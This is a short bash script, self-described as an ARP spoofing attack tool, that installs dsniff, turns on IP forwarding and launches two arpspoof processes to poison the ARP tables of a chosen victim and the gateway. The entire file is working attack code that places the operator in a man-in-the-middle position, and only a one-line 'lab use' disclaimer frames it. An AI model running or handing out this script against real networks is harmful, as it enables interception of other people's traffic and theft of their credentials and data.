#!/bin/bash

# ⚠️ ARP Spoofing Attack Script using arpspoof (dsniff)
# 📌 Use for educational/lab purposes only

# ✅ Change these values before running
INTERFACE="wlan0"
VICTIM_IP="IP"
GATEWAY_IP="IP"

echo "[*] Installing dsniff (for arpspoof)..."
sudo apt install -y dsniff

echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

echo "[*] Starting ARP spoofing..."
echo "[*] Spoofing $VICTIM_IP -> $GATEWAY_IP"
echo "[*] Spoofing $GATEWAY_IP -> $VICTIM_IP"
echo

# Open first arpspoof process in background
xterm -hold -e "sudo arpspoof -i $INTERFACE -t $VICTIM_IP $GATEWAY_IP" &

# Open second arpspoof process in background
xterm -hold -e "sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $VICTIM_IP" &

echo "[*] Two spoofing terminals launched in background. Press Ctrl+C to stop this script."
